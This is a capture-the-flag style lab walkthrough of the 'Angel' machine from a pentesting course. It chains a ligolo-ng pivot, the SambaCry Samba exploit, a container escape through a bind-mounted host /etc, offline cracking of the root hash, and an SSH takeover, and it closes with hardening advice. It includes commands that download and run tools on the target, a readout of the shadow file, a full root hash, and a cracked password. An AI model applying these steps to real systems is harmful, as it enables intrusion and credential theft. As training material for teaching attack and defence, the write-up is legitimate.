---
title: "Angel: Pivoting, SambaCry, and a Container Breakout"
permalink: /writeups/angel-machine/
machine_name: "Angel"
platform: "Spartan Labs — CPPJ 101 (Professional Junior Pentesting Course)"
creator: "gerhsec (Gerardo Eliasib Rueda) — Spartan Cybersecurity"
level: Medium
os: Linux
release_date: 2026-07-11
date: 2026-07-13
lab_url: "https://spartancybersecurity.com/es/courses/curso-profesional-de-pentesting-para-juniors"
lab_name: "Spartan Cybersecurity — CPPJ 101"
prerequisite_url: "https://darknightsoldier.github.io/writeups/editorial-imprenta-machine/"
prerequisite_title: "Editorial / Imprenta (required to pivot into this machine)"
summary: >-
  Once inside the internal network reached by pivoting from Editorial: exploiting a shared network
  resource (SambaCry), abusing a misconfigured Docker container, and cracking the host's password
  hash offline to take over the real target behind the container.
tags: [pivoting, ligolo-ng, smb, cve-2017-7494, docker-breakout, hash-cracking]
---

## Objective

**Angel** is a medium-rated Linux machine from Spartan Cybersecurity's CPPJ 101 lab set, and it is
deliberately **not reachable from the public network**. It only exists on an internal segment that
opens up once [Editorial / Imprenta]({{ page.prerequisite_url }}) has already been compromised — so
that writeup is a hard prerequisite for this one, not just recommended reading.

In the machine author's own words, once inside the internal network the objective is to *"exploit a
shared network resource, abuse a misconfigured container, and crack the host's hash offline to take
the first target after the pivot."* That's exactly the shape of this engagement: a network pivot, a
pre-authentication RCE against Samba, an unexpected landing inside a Docker container instead of on
the real host, and a final offline password-cracking step to reach the actual target machine.

If you want to attempt this lab yourself, it's part of Spartan Cybersecurity's
[Professional Junior Pentesting Course (CPPJ 101)]({{ page.lab_url }}).

## Pivoting from Editorial into the Internal Network

Angel sits on `10.10.12.113`, on a network segment the attacking machine cannot route to directly.
From a root shell on Editorial (obtained in the [prerequisite writeup]({{ page.prerequisite_url }})),
a ping to Angel succeeds — confirming Editorial has a leg into that internal segment:

```bash
ping -c 1 10.10.12.113
```

![Ping to 10.10.12.113 succeeding from a root shell on the Editorial machine](/assets/images/writeups/angel-machine/01-ping-angel-from-editorial.png)

The same ping issued directly from the attacking machine times out, confirming Angel is not routable
without a pivot:

![The same ping to 10.10.12.113 failing with 100% packet loss when run directly from the attacker machine](/assets/images/writeups/angel-machine/02-ping-angel-fails-from-attacker.png)

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is used to build that pivot. A proxy is started on
the attacking machine:

```bash
cd /opt/spartan-ops/bin
sudo ./ligolo-proxy -selfcert
```

![ligolo-proxy starting up and listening for agent connections](/assets/images/writeups/angel-machine/03-ligolo-proxy-start.png)

The matching `ligolo-agent` binary is served over HTTP so it can be pulled onto Editorial:

```bash
python3 -m http.server 8000
```

![Local Python HTTP server serving ligolo-agent and linpeas.sh for later transfer](/assets/images/writeups/angel-machine/04-python-http-server-ligolo-agent.png)

Back on Editorial (as `root`), the agent is downloaded and connected to the proxy:

```bash
curl http://10.10.101.154:8000/ligolo-agent -o /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect 10.10.101.154:11601 -ignore-cert
```

![ligolo-agent connecting back from Editorial to the attacker's ligolo-proxy listener](/assets/images/writeups/angel-machine/05-ligolo-agent-connect.png)

With the agent connected, a route to Angel's subnet is added on the attacking machine and the tunnel
is started from the ligolo console:

```bash
sudo ip route add 10.10.12.0/24 dev ligolo
```

```
session
? Specify a session: 1 - root@editorial - ...
start
```

![Selecting the ligolo agent session, checking ifconfig, and starting the tunnel](/assets/images/writeups/angel-machine/06-ligolo-session-start-tunnel.png)

A final ping confirms the pivot is live — Angel is now reachable through Editorial:

```bash
ping -c 1 10.10.12.113
```

![Successful ping to Angel over the ligolo tunnel, confirming the pivot is working](/assets/images/writeups/angel-machine/07-ping-angel-via-tunnel.png)

## Reconnaissance

With routing in place, a full port scan is run against Angel through the tunnel:

```bash
sudo nmap -p- 10.10.12.113 -sS -sC -sV -T5 -n -Pn -vvv
```

Only two services are exposed:

| Port | Service      | Version                                  |
|------|--------------|--------------------------------------------|
| 22   | SSH          | OpenSSH 8.4p1 Debian 5+deb11u1             |
| 445  | netbios-ssn  | **Samba smbd 4.6.3** (workgroup: SPARTAN)  |

![Nmap scan through the tunnel showing SSH and a Samba 4.6.3 service in the SPARTAN workgroup](/assets/images/writeups/angel-machine/08-nmap-scan-angel.png)

Samba **4.6.3** immediately stands out — it falls inside the vulnerable range for a well-known,
critical remote code execution vulnerability, which is confirmed later in this writeup.

## Enumeration

### SMB Shares

The available shares are listed with an anonymous (null) session:

```bash
smbclient -N -L //10.10.12.113
```

![smbclient listing shares: a "backups" disk share described as an Internal backup share, and IPC$](/assets/images/writeups/angel-machine/09-smbclient-list-shares.png)

The `backups` share allows anonymous, unauthenticated access. Connecting to it and listing its
contents reveals a single file:

```bash
smbclient //10.10.12.113/backups
smb: \> ls
smb: \> lcd /tmp
smb: \> get test.txt
```

![smbclient session connecting to the backups share, listing and downloading test.txt](/assets/images/writeups/angel-machine/10-smbclient-backups-download.png)

```bash
cat test.txt
```

![Contents of the downloaded test.txt file, containing the string "spartan-test"](/assets/images/writeups/angel-machine/11-test-txt-content.png)

The file itself has no direct value, but it proves something more important for the next phase: the
`backups` share is **writable** by an anonymous/guest session — which is exactly the precondition
needed for the Samba vulnerability affecting this version.

## Exploitation: CVE-2017-7494 ("SambaCry")

Samba versions 3.5.0 through 4.6.4 (before 4.4.14 / 4.5.10 / 4.6.4) are vulnerable to
[CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494) — critical (CVSS 9.8), remote,
unauthenticated code execution. A malicious client can upload a shared library to a writable share and
then coerce the server into loading it via a named pipe, executing arbitrary code with the privileges
of the `smbd` process (commonly `root`).

![INCIBE-CERT advisory page for CVE-2017-7494, rated critical with a CVSS 3.1 score of 9.8](/assets/images/writeups/angel-machine/12-cve-2017-7494-advisory.png)

Metasploit ships a ready-made module for this exact vulnerability:

```
msfconsole -q
msf > search CVE-2017-7494
msf > use 0
```

![msfconsole search results for CVE-2017-7494, selecting exploit/linux/samba/is_known_pipename](/assets/images/writeups/angel-machine/13-msfconsole-search-exploit.png)

```
msf exploit(linux/samba/is_known_pipename) > show options
msf exploit(linux/samba/is_known_pipename) > set RHOSTS 10.10.12.113
msf exploit(linux/samba/is_known_pipename) > run
```

The exploit uploads a shared object to the writable `backups` share, forces `smbd` to load it via a
named pipe, and returns a command shell running as `root`:

![Metasploit exploit succeeding: payload uploaded to the backups share, loaded, and a root command shell returned](/assets/images/writeups/angel-machine/14-msfconsole-exploit-success.png)

A quick look around confirms the first flag on this host:

```bash
cd /root
cat lowpriv.txt
```

![Shell obtained via the Samba exploit, listing /root and reading the lowpriv.txt flag](/assets/images/writeups/angel-machine/15-container-lowpriv-flag.jpg)

Getting `root` this easily — directly from an unauthenticated RCE — is a strong hint that this isn't
the "real" host yet. That suspicion is confirmed in the next phase.

## Post-Exploitation: Identifying the Docker Container

Because the attacking machine still has no direct route to Angel (only Editorial does), getting
LinPEAS onto the target requires a **second relay hop**: attacker → Editorial → Angel.

The attacker serves LinPEAS locally:

```bash
python3 -m http.server 8000
```

![Local Python HTTP server on the attacker machine serving linpeas.sh](/assets/images/writeups/angel-machine/16-python-http-server-attacker.png)

From an SSH session on Editorial (as `admin`, reusing the private key from the prerequisite writeup),
a second relay server is started to bridge the file over to Angel:

```bash
ssh admin@blog.editorial -i id_rsa
mkdir peas && cd peas
curl http://10.10.101.154:8000/linpeas.sh -o linpeas.sh
python3 -m http.server 8000
```

![SSH session on Editorial relaying linpeas.sh through a second local HTTP server](/assets/images/writeups/angel-machine/17-ssh-editorial-relay-linpeas.png)

Back in the Metasploit shell on Angel — which only has a minimal Python 2-style environment available —
the script is pulled from Editorial's relay and executed:

```bash
python -c "import urllib;urllib.urlretrieve('http://10.10.11.103:8000/linpeas.sh','/tmp/linpeas.sh')"
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

![LinPEAS being downloaded onto Angel through the Editorial relay and executed](/assets/images/writeups/angel-machine/18-download-linpeas-angel-shell.png)

LinPEAS immediately flags the environment as a **Docker container** (presence of `/.dockerenv` and a
matching systemd container marker):

![LinPEAS container-detection module confirming the shell is running inside a Docker container](/assets/images/writeups/angel-machine/19-linpeas-docker-detected.png)

Cross-referencing this with the earlier nmap result is telling: SSH on port 22 was seen from the
outside, but the container's own listening sockets only show **139/445** — port 22 belongs to the
underlying Docker **host**, not to this container:

![ss output inside the container showing only SMB-related ports listening — SSH is not part of this namespace](/assets/images/writeups/angel-machine/20-linpeas-ports-not-in-container.png)

### Escaping the Container's View via a Mounted Host Partition

Digging through LinPEAS's filesystem findings turns up something far more useful than a kernel exploit
or a SUID binary: an **interesting mount point**. The container has `/host_etc` bound to
`/dev/nvme0n1p1` — the underlying host's real root partition — mounted as `ext4`:

![LinPEAS listing interesting mounted filesystems, including /host_etc mapped to /dev/nvme0n1p1 (ext4)](/assets/images/writeups/angel-machine/21-linpeas-host-etc-mount.png)

This is a classic container misconfiguration: a host path was bind-mounted into the container,
effectively handing over read access to the host's entire `/etc` directory — including its shadow
password file. Confirming the hostname makes it clear this belongs to a different, "real" machine:

```bash
ls -la /host_etc
cat /host_etc/hostname
```

![Listing /host_etc and reading its hostname file, which resolves to "angel" — the real host behind the container](/assets/images/writeups/angel-machine/22-host-etc-hostname-shadow-listing.png)

And, critically, the shadow file itself is readable:

```bash
cat /host_etc/shadow
```

![Contents of /host_etc/shadow, exposing the host's root password hash](/assets/images/writeups/angel-machine/23-host-etc-shadow-contents.png)

## Privilege Escalation: Offline Hash Cracking

With the host's `root` hash in hand, the next step is offline cracking rather than any further remote
exploitation. The hash is saved locally and run through `hashcat` in `sha512crypt` mode against
`rockyou.txt`:

```bash
echo 'root:$6$J2I2B/9W$r8.DJ7Nt6QvPHbmN429Jf.DQekUUwCioArcu1nUrKDbJmAkMdUORCPiB3fwt4FPN0qfQXHfTRBS1sze.8ak.4/:20580:0:99999:7:::' > hash.txt
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

![hashcat starting a sha512crypt attack against the extracted root hash using rockyou.txt](/assets/images/writeups/angel-machine/24-hashcat-crack-start.png)

The wordlist attack succeeds in a matter of minutes:

![hashcat reporting the hash as cracked, recovering the plaintext root password](/assets/images/writeups/angel-machine/25-hashcat-cracked-password.png)

### Reaching the Real Host

Armed with valid `root` credentials, the actual host behind the container — the one that answered on
port 22 during the initial scan — is reached directly over SSH, bypassing the container entirely:

```bash
ssh root@10.10.12.113
cat highpriv.txt
```

![Successful root SSH login to the real Angel host and the final highpriv.txt flag](/assets/images/writeups/angel-machine/26-root-ssh-host-flag.jpg)

The hostname banner confirms this is the genuine `angel` host, and the final flag is retrieved,
completing the engagement.

## Attack Chain Summary

| # | Phase                  | Exploitation Vector                                                                          | Impact                                        |
|---|--------------------------|-----------------------------------------------------------------------------------------------|-------------------------------------------------|
| 1 | Pivoting                | Reused root access on Editorial + Ligolo-ng tunneling to reach the internal `10.10.12.0/24` segment | Network access to the otherwise unreachable Angel host |
| 2 | Enumeration              | Anonymous/guest access to a writable SMB share (`backups`)                                    | Confirmed a viable upload path for exploitation |
| 3 | Exploitation             | CVE-2017-7494 (SambaCry) against Samba 4.6.3 via `is_known_pipename`                          | Unauthenticated remote code execution as `root` |
| 4 | Post-Exploitation        | LinPEAS enumeration revealing the shell was inside a Docker container                          | Correct scoping of the actual attack surface   |
| 5 | Container Misconfiguration | Host root partition bind-mounted into the container at `/host_etc` (readable `shadow` file)  | Disclosure of the host's `root` password hash  |
| 6 | Privilege Escalation     | Offline cracking of the `sha512crypt` hash with hashcat + rockyou.txt                          | Valid `root` credentials for the real host      |
| 7 | Full Compromise          | SSH authentication as `root` directly to the underlying host                                   | Complete compromise of the host behind the container |

The most interesting lesson here isn't the SambaCry exploit itself — it's well documented and nearly a
decade old — but the fact that gaining `root` didn't actually mean gaining the target. Recognizing the
container boundary, and then finding the specific misconfiguration (a bind-mounted host path) needed to
cross it, was the real challenge of this box.

## Remediation & Hardening Recommendations

- **Patch Samba.** CVE-2017-7494 has been fixed since 2017 (4.6.4 / 4.5.10 / 4.4.14). Running 4.6.3 in
  2026 reflects a missing patch-management process, not a lack of available fixes.
- **Never allow anonymous write access to SMB shares.** The `backups` share being both guest-accessible
  and writable is what turned a patchable vulnerability into a working exploit. Require authentication
  and restrict write access to the specific accounts that need it.
- **Never bind-mount host paths into containers unless strictly required**, and if it is required, mount
  them **read-only** and scope them to the narrowest possible subdirectory. `/host_etc` exposing the
  entire host `/etc`, `shadow` included, defeats the purpose of container isolation entirely.
- **Avoid weak, dictionary-based passwords for privileged accounts**, even on internal-only hosts.
  `Spartans1` falls to a standard `rockyou.txt` attack in minutes. Internal segmentation is not a
  substitute for credential hygiene — this same host was reachable the moment a pivot existed.
- **Treat internal network segments as hostile once any host on them is compromised.** Angel was placed
  on a network unreachable from the internet, but that boundary meant nothing after Editorial fell —
  reinforcing the need for east-west segmentation and monitoring, not just perimeter controls.

## Key Takeaways

Angel is a good example of a multi-stage internal engagement: a pivot to even reach the target, a
still-relevant public CVE to get initial code execution, and a container misconfiguration that had to
be recognized and worked around before the "real" privilege escalation — cracking a password hash —
could happen. Each stage depended on correctly identifying *what* had actually been compromised (a
container, not a host) before deciding what to do next.
